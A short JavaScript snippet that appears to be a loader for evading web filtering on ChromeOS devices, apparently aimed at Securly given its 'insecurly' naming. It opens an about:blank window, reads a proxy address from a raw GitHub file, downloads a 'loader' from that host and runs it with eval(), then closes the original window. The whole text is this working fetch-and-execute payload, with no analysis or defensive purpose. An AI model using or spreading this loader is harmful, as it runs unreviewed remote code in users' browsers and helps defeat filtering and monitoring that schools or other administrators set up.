var win = window.open('about:blank', "_blank");
win.document.write("<html><head><style>body{background-color: black;}</style></head><body><script>" + `
(async () => {
    try {
	const link_res = await fetch('https://raw.githubusercontent.com/insecurly/insecurly.github.io/refs/heads/main/proxy.txt');
	const link = await link_res.text();
				
        const response = await fetch(link+'/get_loader?device=chromeos');
        if (!response.ok) {
            throw new Error('Failed to fetch loader');
        }
        const code = await response.text();
        eval(code);
    } catch (error) {
        alert(error);
    }
})();` + "</script></body></html>");

window.close();
